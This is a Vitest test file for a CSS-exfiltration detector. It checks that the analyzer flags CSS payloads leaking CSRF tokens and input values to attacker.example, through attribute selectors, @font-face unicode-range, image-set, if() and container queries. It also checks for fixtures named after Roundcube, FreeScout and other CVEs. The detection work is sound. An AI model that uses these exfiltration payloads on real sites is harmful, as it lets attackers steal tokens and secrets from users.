import { describe, expect, it } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { analyzeStylesheet } from "../../src/core/analyzer/analyzeStylesheet";
import { scanDocument } from "../../src/browser/scanner/scanDocument";
import { scanHtmlResourceAttributes } from "../../src/browser/scanner/htmlResourceScan";

const pageUrl = "https://app.example.test/";
function hasFinding(css: string): boolean { return analyzeStylesheet({ cssText: css, pageUrl, sourceKind: "style_element", sourceUrl: pageUrl }).findings.some((finding) => finding.severity !== "info"); }

describe("SPEC and CVE_SPEC acceptance criteria", () => {
  it("covers issue-derived analyzer criteria", () => {
    expect(hasFinding('[data-value="0"]{background:url(/ok.png)}')).toBe(false);
    expect(hasFinding('input[value^="b"]{background:url(https://example.test/;base64,pwned.png)}')).toBe(true);
    expect(hasFinding('input[value^="b"]{background:url(https://example.test/a.png#;base64,)}')).toBe(true);
    expect(hasFinding('.icon{background:url(data:image/png;base64,iVBORw0KGgo=)}')).toBe(false);
    expect(hasFinding('input[name="csrf_token"][value^="a"]~.leak{background-image:image-set("https://attacker.example/a.png" 1x)}')).toBe(true);
    expect(hasFinding('@font-face{font-family:"LeakRange";src:url("https://attacker.example/a.woff2");unicode-range:U+0061}input[name="csrf_token"][value^="a"]~.x{font-family:"LeakRange"}')).toBe(true);
    expect(hasFinding('div{--v:attr(data-user);background:image-set(if(style(--v:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}')).toBe(true);
    expect(hasFinding('@font-face{font-family:"LeakMetrics";src:url("https://attacker.example/leak.woff2")}.secret{font-family:"LeakMetrics";width:fit-content}@container (min-width:1px){.secret{background:url(https://attacker.example/container)}}')).toBe(true);
    expect(hasFinding('@font-face{font-family:"LeakStatic";src:url("https://attacker.example/leak.woff2")}.leak{font-family:"LeakStatic";font-feature-settings:"liga" 1;width:fit-content}.leak::before{font-family:"LeakStatic";content:"\\100"}@container (width:11px){head::before{content:url(https://attacker.example/static)}}')).toBe(true);
    expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--link)}')).toBe(true);
    expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--missing,var(--link))}')).toBe(true);
    expect(hasFinding('@supports(display:grid){@media screen{input[value^="x"]{background:url(https://attacker.example/x)}}}')).toBe(true);
    expect(hasFinding('form:has(input[name="token"][value^="x"]){background:url(https://attacker.example/x)}')).toBe(true);
    expect(hasFinding('svg:has(input[name="token"]){fill:url(https://attacker.example/paint.svg#x)}')).toBe(true);
    expect(hasFinding('input[name="csrf_token"][type="hidden"]{--leaked-secret:attr(value);background-image:image-set(if(style(--leaked-secret:"alpha"): "https://attacker.example/hono-alpha.png"; else: "https://attacker.example/hono-other.png") 1x)}')).toBe(true);
    expect(hasFinding('.recipe-instructions .step-note{color:#4b5563;border-inline-start:0.25rem solid currentColor}')).toBe(false);
    expect(hasFinding('.message-content .overlay{position:fixed !important;inset:0}')).toBe(false);
    expect(hasFinding('input[name="_token"][value^="a"]{background:url(https://attacker.example/freescout)}')).toBe(true);
  });

  it("does not treat same-origin decorative HTML/SVG resources as actionable leaks", () => {
    const documentRef = new DOMParser().parseFromString('<body background="/theme.png"><svg><filter><feImage href="/shadow.png"></feImage></filter><animate attributeName="fill" values="url(/icon.svg#paint)"></animate></svg></body>', "text/html");
    const summary = scanHtmlResourceAttributes({ documentRef, pageUrl, frameUrl: pageUrl });
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("reports cross-origin frames as partial coverage", () => {
    document.body.innerHTML = '<iframe src="https://third-party.example.test/mail"></iframe>';
    const summary = scanDocument(document);
    expect(summary.partialFrames).toBeGreaterThan(0);
    expect(summary.findings.some((finding) => finding.reasons.includes("frame.cross_origin.uninspectable"))).toBe(true);
  });

  it("reports cross-origin SVG resource attributes as actionable remote resource sinks", () => {
    const documentRef = new DOMParser().parseFromString('<svg><rect filter="url(https://attacker.example/filter.svg#x)"></rect></svg>', "text/html");
    const summary = scanHtmlResourceAttributes({ documentRef, pageUrl, frameUrl: pageUrl });
    expect(summary.findings.some((finding) => finding.reasons.includes("sink.svg_resource_remote") && finding.destinationOrigin === "https://attacker.example")).toBe(true);
  });

  it("reports external SVG image documents as optional partial coverage", () => {
    document.body.innerHTML = '<img src="https://cdn.example.test/logo.svg"><object data="/local.svg"></object>';
    const summary = scanDocument(document, {
      mode: "balanced",
      advancedModeEnabled: true,
      trustedOrigins: [],
      blockedOrigins: [],
      strictOrigins: [],
      allowlistedOrigins: [],
      blocklistedOrigins: [],
      perOriginModes: {},
      logRetentionDays: 14,
      compatibility: {
          enableDnrMitigation: true,
        enableStrictThirdPartyBlocking: true,
        showPartialAnalysisFindings: true,
        enableFirefoxEnhancedMode: false,
        reportExternalSvgImageDocuments: true,
        enableSvgImageDnrPolicy: false,
        enableContentNeutralization: true
      }
    });
    expect(summary.findings.some((finding) => finding.reasons.includes("resource.svg_image_document.uninspectable"))).toBe(true);
    expect(summary.partialStylesheets).toBeGreaterThan(0);
  });

  it("has all CVE and parser-differential fixture names in tests/fixtures", () => {
    const attacks = new Set(readdirSync(join(join(process.cwd(), "tests", "fixtures", "attacks"))));
    for (const expected of [
      "cve-2024-29384-parser-bypass.css",
      "cve-2024-33436-css-vars-url.css",
      "cve-2024-33436-css-vars-fallback-chain.css",
      "cve-2024-33437-nested-style-rules.css",
      "css-comments-hidden-url.css",
      "css-escaped-function-url.css",
      "css-mixed-case-import.css",
      "namespace-sanitizer-bypass.css",
      "parser-differential-malformed-recovery.css",
      "rendered-email-style-exfil.html",
      "rendered-helpdesk-email-css.html",
      "wordpress-comment-nonce-exfil.html",
      "markdown-rendered-style-tag.html",
      "inline-style-sensitive-value-url.html",
      "inline-style-var-chain-url.html",
      "inline-style-image-set-url.html",
      "cve-2025-68460-roundcube-style-sanitizer.html",
      "cve-2026-26079-roundcube-comment-css-injection.html",
      "cve-2026-35540-roundcube-stylesheet-link-local-network.html",
      "cve-2026-25916-roundcube-svg-feimage.html",
      "cve-2026-35542-roundcube-body-background.html",
      "cve-2026-35543-roundcube-svg-animate-url.html",
      "cve-2026-35545-roundcube-svg-animate-fill-filter-stroke.html",
      "cve-2026-35544-roundcube-fixed-position-important.html",
      "cve-2026-40301-domsanitizer-svg-style-url.html",
      "cve-2026-40301-domsanitizer-svg-style-import.html",
      "cve-2026-31873-unhead-mixed-case-data-css-link.html",
      "cve-2026-28348-lxml-html-clean-escaped-import.css",
      "large-stylesheet-full-source-scan-import.css",
      "large-stylesheet-full-source-scan-value-probe.css",
      "large-stylesheet-full-source-scan-nested.css",
      "poc-test-1-base64-fragment.css",
      "poc-test-1-1-base64-path.css",
      "poc-test-2-css-var-url.css",
      "poc-test-2-1-css-var-fallback.css",
      "poc-test-3-supports.css",
      "poc-test-3-1-media.css",
      "image-set-string-form.css",
      "font-face-unicode-range-sensitive.css",
      "inline-style-attr-if-url.html",
      "inline-style-attr-if-image-set-string.html",
      "inline-style-nested-if-chain-url.html",
      "fontleak-container-query-url.css",
      "fontleak-keyframes-url.css",
      "fontleak-static-ligature-container.css",
      "fontleak-import-chain-container.css",
      "fontleak-font-chaining-animation.css",
      "cve-2026-39315-unhead-leading-zero-data-css-link.html",
      "cve-2026-41159-mermaid-theme-css-scope-escape.css",
      "cve-2026-41148-mermaid-classdef-breakout.css",
      "ghsa-vrx2-77f2-ww34-justhtml-preserved-style.html",
      "ghsa-vrx2-77f2-ww34-justhtml-svg-filter.html",
      "cve-2026-26000-xwiki-css-exfil-comment.css",
      "cve-2026-44458-hono-jsx-ssr-inline-style.html",
      "cve-2026-35046-tandoor-stored-recipe-style.html",
      "cve-2026-40497-freescout-style-token-exfil.html"
    ]) {
      expect(attacks.has(expected), expected).toBe(true);
      expect(attacks.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
    }
  });


  it("has advisory-derived benign fixture names in tests/fixtures", () => {
    const benign = new Set(readdirSync(join(join(process.cwd(), "tests", "fixtures", "benign"))));
    for (const expected of [
      "benign-hono-jsx-ssr-style-object-presentation.html",
      "benign-tandoor-recipe-presentation-style.html",
      "benign-freescout-signature-style.html"
    ]) {
      expect(benign.has(expected), expected).toBe(true);
      expect(benign.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
    }
  });

  it("does not contain the deprecated fixed marker or extension-context fetch code", () => {
    const srcRoot = join(process.cwd(), "src");
    const files: string[] = [];
    const walk = (dir: string) => { for (const item of readdirSync(dir, { withFileTypes: true })) { const path = join(dir, item.name); if (item.isDirectory()) walk(path); else if (/\.(ts|tsx|css|html)$/.test(path)) files.push(path); } };
    walk(srcRoot);
    const source = files.map((file) => readFileSync(file, "utf8")).join("\n");
    expect(source).not.toContain("__css_exfil_protection_filtered_styles");
    expect(source).not.toMatch(/fetch\s*\([^)]*\.css/);
  });
});
